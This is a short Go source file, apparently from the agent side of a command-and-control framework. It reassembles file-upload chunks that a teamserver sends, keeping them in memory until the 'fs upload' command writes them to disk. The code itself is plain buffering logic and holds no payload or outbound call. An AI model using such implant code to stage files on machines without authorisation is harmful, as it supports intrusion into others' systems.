package main

import "sync"

// upload 使用 teamserver 的 MEM_FILE 分块机制：
// 每块任务负载为 [MemFileID int32][TotalSize uint64][Chunk bytes]，
// agent 累积完整后再由 fs upload 命令落盘。

type memFile struct {
	total uint64
	data  []byte
}

var (
	memMu    sync.Mutex
	memFiles = make(map[uint32]*memFile)
)

func handleMemFile(p *parser, req uint32) {
	id := uint32(p.i32())
	total := uint64(p.i64())
	chunk := p.bytes()

	memMu.Lock()
	mf, ok := memFiles[id]
	if !ok {
		mf = &memFile{total: total}
		memFiles[id] = mf
	}
	mf.data = append(mf.data, chunk...)
	done := uint64(len(mf.data)) >= mf.total
	memMu.Unlock()

	out := newPacker()
	out.i32(int32(id))
	if done {
		out.i32(1)
	} else {
		out.i32(0)
	}
	enqueue(cmdMemFile, req, out.b)
}

func memFileGet(id uint32) ([]byte, bool) {
	memMu.Lock()
	defer memMu.Unlock()
	mf, ok := memFiles[id]
	if !ok {
		return nil, false
	}
	if uint64(len(mf.data)) < mf.total {
		return nil, false
	}
	data := mf.data
	delete(memFiles, id)
	return data, true
}
